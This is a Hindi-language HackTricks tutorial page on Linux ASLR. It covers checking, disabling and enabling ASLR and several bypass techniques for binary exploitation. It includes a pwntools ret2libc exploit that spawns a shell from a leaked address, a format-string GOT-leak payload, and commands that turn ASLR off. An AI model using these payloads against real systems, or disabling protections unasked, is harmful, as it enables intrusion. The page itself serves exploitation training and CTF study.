# ASLR

{{#include ../../../../banners/hacktricks-training.md}}

## Basic Information

**एड्रेस स्पेस लेआउट रैंडमाइजेशन (ASLR)** एक सुरक्षा तकनीक है जो ऑपरेटिंग सिस्टम में **सिस्टम और एप्लिकेशन प्रक्रियाओं द्वारा उपयोग किए जाने वाले मेमोरी पते** को रैंडमाइज़ करने के लिए उपयोग की जाती है। ऐसा करने से, यह हमलावर के लिए विशिष्ट प्रक्रियाओं और डेटा, जैसे कि स्टैक, हीप, और लाइब्रेरी के स्थान की भविष्यवाणी करना काफी कठिन बना देता है, जिससे कुछ प्रकार के एक्सप्लॉइट्स, विशेष रूप से बफर ओवरफ्लोज़ को कम किया जा सकता है।

### **ASLR स्थिति की जांच करना**

Linux सिस्टम पर ASLR स्थिति **जांचने** के लिए, आप `/proc/sys/kernel/randomize_va_space` फ़ाइल से मान पढ़ सकते हैं। इस फ़ाइल में संग्रहीत मान यह निर्धारित करता है कि किस प्रकार का ASLR लागू किया जा रहा है:

- **0**: कोई रैंडमाइजेशन नहीं। सब कुछ स्थिर है।
- **1**: संवेदनशील रैंडमाइजेशन। साझा लाइब्रेरी, स्टैक, mmap(), VDSO पृष्ठ रैंडमाइज किए जाते हैं।
- **2**: पूर्ण रैंडमाइजेशन। संवेदनशील रैंडमाइजेशन द्वारा रैंडमाइज किए गए तत्वों के अलावा, `brk()` के माध्यम से प्रबंधित मेमोरी रैंडमाइज की जाती है।

आप निम्नलिखित कमांड के साथ ASLR स्थिति की जांच कर सकते हैं:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLR को अक्षम करना**

ASLR को **अक्षम** करने के लिए, आप `/proc/sys/kernel/randomize_va_space` का मान **0** पर सेट करते हैं। ASLR को सामान्यतः परीक्षण या डिबगिंग परिदृश्यों के बाहर अक्षम करने की सिफारिश नहीं की जाती है। इसे अक्षम करने का तरीका यहाँ है:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
आप एक निष्पादन के लिए ASLR को निम्नलिखित के साथ भी अक्षम कर सकते हैं:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLR सक्षम करना**

ASLR को **सक्षम** करने के लिए, आप `/proc/sys/kernel/randomize_va_space` फ़ाइल में **2** का मान लिख सकते हैं। इसके लिए आमतौर पर रूट विशेषाधिकार की आवश्यकता होती है। पूर्ण यादृच्छिकता सक्षम करने के लिए निम्नलिखित कमांड का उपयोग किया जा सकता है:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **रिबूट के दौरान स्थिरता**

`echo` कमांड के साथ किए गए परिवर्तन अस्थायी होते हैं और रिबूट पर रीसेट हो जाएंगे। परिवर्तन को स्थायी बनाने के लिए, आपको `/etc/sysctl.conf` फ़ाइल को संपादित करना होगा और निम्नलिखित पंक्ति को जोड़ना या संशोधित करना होगा:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
`/etc/sysctl.conf` को संपादित करने के बाद, परिवर्तनों को लागू करने के लिए:
```bash
sudo sysctl -p
```
यह सुनिश्चित करेगा कि आपके ASLR सेटिंग्स रिबूट के दौरान बनी रहें।

## **बायपास**

### 32-बिट ब्रूट-फोर्सिंग

PaX प्रक्रिया पते की जगह को **3 समूहों** में विभाजित करता है:

- **कोड और डेटा** (आरंभित और अप्रारंभित): `.text`, `.data`, और `.bss` —> `delta_exec` चर में **16 बिट्स** की एंट्रॉपी। यह चर प्रत्येक प्रक्रिया के साथ यादृच्छिक रूप से आरंभ किया जाता है और प्रारंभिक पते में जोड़ा जाता है।
- `mmap()` द्वारा आवंटित **मेमोरी** और **साझा पुस्तकालय** —> **16 बिट्स**, जिसे `delta_mmap` कहा जाता है।
- **स्टैक** —> **24 बिट्स**, जिसे `delta_stack` कहा जाता है। हालाँकि, यह प्रभावी रूप से **11 बिट्स** का उपयोग करता है (10वें से 20वें बाइट तक समावेशी), **16 बाइट्स** के लिए संरेखित —> इसके परिणामस्वरूप **524,288 संभावित वास्तविक स्टैक पते** होते हैं।

पिछला डेटा 32-बिट सिस्टम के लिए है और अंतिम एंट्रॉपी में कमी ASLR को बार-बार निष्पादन को फिर से प्रयास करके बायपास करना संभव बनाती है जब तक कि एक्सप्लॉइट सफलतापूर्वक पूरा न हो जाए।

#### ब्रूट-फोर्स विचार:

- यदि आपके पास **शेलकोड से पहले एक बड़ा NOP स्लेड** रखने के लिए पर्याप्त ओवरफ्लो है, तो आप बस स्टैक में पते को ब्रूट-फोर्स कर सकते हैं जब तक कि प्रवाह **NOP स्लेड के कुछ हिस्से पर कूद न जाए**।
- यदि ओवरफ्लो इतना बड़ा नहीं है और एक्सप्लॉइट को स्थानीय रूप से चलाया जा सकता है, तो **एक पर्यावरण चर में NOP स्लेड और शेलकोड जोड़ना** संभव है।
- यदि एक्सप्लॉइट स्थानीय है, तो आप libc के आधार पते को ब्रूट-फोर्स करने की कोशिश कर सकते हैं (32-बिट सिस्टम के लिए उपयोगी):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- यदि आप एक दूरस्थ सर्वर पर हमला कर रहे हैं, तो आप **`libc` फ़ंक्शन `usleep` के पते को ब्रूट-फोर्स करने** की कोशिश कर सकते हैं, उदाहरण के लिए 10 को तर्क के रूप में पास करते हुए। यदि किसी बिंदु पर **सर्वर प्रतिक्रिया देने में 10 सेकंड अतिरिक्त समय लेता है**, तो आपने इस फ़ंक्शन का पता लगा लिया है।

> [!TIP]
> 64-बिट सिस्टम में एंट्रॉपी बहुत अधिक होती है और यह संभव नहीं है।

### स्थानीय जानकारी (`/proc/[pid]/stat`)

एक प्रक्रिया की फ़ाइल **`/proc/[pid]/stat`** हमेशा सभी के लिए पढ़ने योग्य होती है और इसमें **दिलचस्प** जानकारी होती है जैसे:

- **startcode** & **endcode**: बाइनरी के **TEXT** के ऊपर और नीचे के पते
- **startstack**: **स्टैक** की शुरुआत का पता
- **start_data** & **end_data**: जहाँ **BSS** है, उसके ऊपर और नीचे के पते
- **kstkesp** & **kstkeip**: वर्तमान **ESP** और **EIP** पते
- **arg_start** & **arg_end**: जहाँ **cli arguments** हैं, उसके ऊपर और नीचे के पते।
- **env_start** & **env_end**: जहाँ **env variables** हैं, उसके ऊपर और नीचे के पते।

इसलिए, यदि हमलावर उसी कंप्यूटर में है जहाँ बाइनरी का शोषण किया जा रहा है और यह बाइनरी कच्चे तर्कों से ओवरफ्लो की अपेक्षा नहीं करती है, बल्कि इस फ़ाइल को पढ़ने के बाद तैयार किए गए एक अलग **इनपुट से**। तो एक हमलावर के लिए **इस फ़ाइल से कुछ पते प्राप्त करना और उनके लिए शोषण के लिए ऑफसेट बनाना संभव है**।

> [!TIP]
> इस फ़ाइल के बारे में अधिक जानकारी के लिए [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) पर `/proc/pid/stat` खोजें।

### लीक होना

- **चुनौती एक लीक देना है**

यदि आपको एक लीक दिया गया है (आसान CTF चुनौतियाँ), तो आप इससे ऑफसेट्स की गणना कर सकते हैं (मान लेते हैं कि आप जानते हैं कि आप जिस सिस्टम का शोषण कर रहे हैं, उसमें कौन सा libc संस्करण उपयोग किया जा रहा है)। यह उदाहरण शोषण [**यहाँ से उदाहरण**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) से निकाला गया है (अधिक विवरण के लिए उस पृष्ठ की जांच करें):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
- **ret2plt**

एक बफर ओवरफ्लो का दुरुपयोग करते हुए, **ret2plt** का उपयोग करके libc से एक फ़ंक्शन का पता निकालना संभव होगा। जाँच करें:

{{#ref}}
ret2plt.md
{{#endref}}

- **Format Strings Arbitrary Read**

जैसे कि ret2plt में, यदि आपके पास एक फॉर्मेट स्ट्रिंग्स भेद्यता के माध्यम से एक मनमाना पढ़ने की क्षमता है, तो GOT से **libc function** का पता निकालना संभव है। निम्नलिखित [**उदाहरण यहाँ से है**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
आप Format Strings के मनमाने पढ़ने के बारे में अधिक जानकारी यहाँ पा सकते हैं:

{{#ref}}
../../format-strings/
{{#endref}}

### Ret2ret & Ret2pop

स्टैक के अंदर पते का दुरुपयोग करके ASLR को बायपास करने की कोशिश करें:

{{#ref}}
../../stack-overflow/ret2ret.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
